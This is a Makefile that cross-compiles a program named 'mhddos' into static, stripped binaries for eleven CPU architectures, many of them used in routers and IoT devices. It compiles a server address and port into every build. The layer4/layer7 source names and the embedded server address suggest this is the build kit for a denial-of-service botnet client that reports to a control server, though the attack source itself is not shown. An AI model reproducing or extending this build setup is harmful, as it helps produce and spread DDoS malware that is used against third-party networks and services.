SERVER_IP ?= 0.0.0.0
SERVER_PORT_NUM ?= 8443

CFLAGS = -Wall -Os -D_GNU_SOURCE \
         -DSERVER_HOST=\"$(SERVER_IP)\" \
         -DSERVER_PORT=$(SERVER_PORT_NUM) \
         -ffunction-sections -fdata-sections \
         -fno-asynchronous-unwind-tables -fno-ident \
         -fomit-frame-pointer -fmerge-all-constants \
         -fno-unwind-tables -fno-stack-protector

LDFLAGS = -static -Wl,--gc-sections -Wl,-s -Wl,--build-id=none

SRCS = main.c utils.c layer4.c layer7.c
TARGET = mhddos

all: x86_64 x86 mips mipsel mips64 arm armhf arm64 armeb ppc sh4
	@echo "=========================================="
	@echo " SERVER=$(SERVER_IP):$(SERVER_PORT_NUM)"
	@echo "=========================================="
	@ls -la $(TARGET)_* 2>/dev/null || true

x86_64:
	@/opt/x86_64-linux-musl-cross/bin/x86_64-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_x86_64 $(LDFLAGS) 2>/dev/null || \
	x86_64-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_x86_64 $(LDFLAGS) 2>/dev/null || \
	gcc $(CFLAGS) $(SRCS) -o $(TARGET)_x86_64 $(LDFLAGS) 2>/dev/null || true
	@strip -s $(TARGET)_x86_64 2>/dev/null || true

x86:
	@/opt/i686-linux-musl-cross/bin/i686-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_x86 $(LDFLAGS) 2>/dev/null || \
	i686-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_x86 $(LDFLAGS) 2>/dev/null || \
	i686-linux-gnu-gcc -m32 $(CFLAGS) $(SRCS) -o $(TARGET)_x86 $(LDFLAGS) 2>/dev/null || true
	@strip -s $(TARGET)_x86 2>/dev/null || true

mips:
	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mips $(LDFLAGS) 2>/dev/null || \
	mips-linux-gnu-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mips $(LDFLAGS) 2>/dev/null || true
	@/opt/mips-linux-musl-cross/bin/mips-linux-musl-strip -s $(TARGET)_mips 2>/dev/null || mips-linux-gnu-strip -s $(TARGET)_mips 2>/dev/null || true

mipsel:
	@/opt/mipsel-linux-musl-cross/bin/mipsel-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mipsel $(LDFLAGS) 2>/dev/null || \
	mipsel-linux-gnu-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mipsel $(LDFLAGS) 2>/dev/null || true
	@/opt/mipsel-linux-musl-cross/bin/mipsel-linux-musl-strip -s $(TARGET)_mipsel 2>/dev/null || mipsel-linux-gnu-strip -s $(TARGET)_mipsel 2>/dev/null || true

mips64:
	@/opt/mips64-linux-musl-cross/bin/mips64-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_mips64 $(LDFLAGS) 2>/dev/null || true
	@/opt/mips64-linux-musl-cross/bin/mips64-linux-musl-strip -s $(TARGET)_mips64 2>/dev/null || true

arm:
	@/opt/arm-linux-musleabi-cross/bin/arm-linux-musleabi-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_arm $(LDFLAGS) 2>/dev/null || \
	arm-linux-gnueabi-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_arm $(LDFLAGS) 2>/dev/null || true
	@/opt/arm-linux-musleabi-cross/bin/arm-linux-musleabi-strip -s $(TARGET)_arm 2>/dev/null || arm-linux-gnueabi-strip -s $(TARGET)_arm 2>/dev/null || true

armhf:
	@/opt/arm-linux-musleabihf-cross/bin/arm-linux-musleabihf-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_armhf $(LDFLAGS) 2>/dev/null || \
	arm-linux-gnueabihf-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_armhf $(LDFLAGS) 2>/dev/null || true
	@/opt/arm-linux-musleabihf-cross/bin/arm-linux-musleabihf-strip -s $(TARGET)_armhf 2>/dev/null || arm-linux-gnueabihf-strip -s $(TARGET)_armhf 2>/dev/null || true

arm64:
	@/opt/aarch64-linux-musl-cross/bin/aarch64-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_arm64 $(LDFLAGS) 2>/dev/null || \
	aarch64-linux-gnu-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_arm64 $(LDFLAGS) 2>/dev/null || true
	@/opt/aarch64-linux-musl-cross/bin/aarch64-linux-musl-strip -s $(TARGET)_arm64 2>/dev/null || aarch64-linux-gnu-strip -s $(TARGET)_arm64 2>/dev/null || true

armeb:
	@/opt/armeb-linux-musleabi-cross/bin/armeb-linux-musleabi-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_armeb $(LDFLAGS) 2>/dev/null || true
	@/opt/armeb-linux-musleabi-cross/bin/armeb-linux-musleabi-strip -s $(TARGET)_armeb 2>/dev/null || true

ppc:
	@/opt/powerpc-linux-musl-cross/bin/powerpc-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_ppc $(LDFLAGS) 2>/dev/null || \
	powerpc-linux-gnu-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_ppc $(LDFLAGS) 2>/dev/null || true
	@/opt/powerpc-linux-musl-cross/bin/powerpc-linux-musl-strip -s $(TARGET)_ppc 2>/dev/null || powerpc-linux-gnu-strip -s $(TARGET)_ppc 2>/dev/null || true

sh4:
	@/opt/sh4-linux-musl-cross/bin/sh4-linux-musl-gcc $(CFLAGS) $(SRCS) -o $(TARGET)_sh4 $(LDFLAGS) 2>/dev/null || true
	@/opt/sh4-linux-musl-cross/bin/sh4-linux-musl-strip -s $(TARGET)_sh4 2>/dev/null || true

clean:
	rm -f $(TARGET)_*

.PHONY: all clean x86_64 x86 mips mipsel mips64 arm armhf arm64 armeb ppc sh4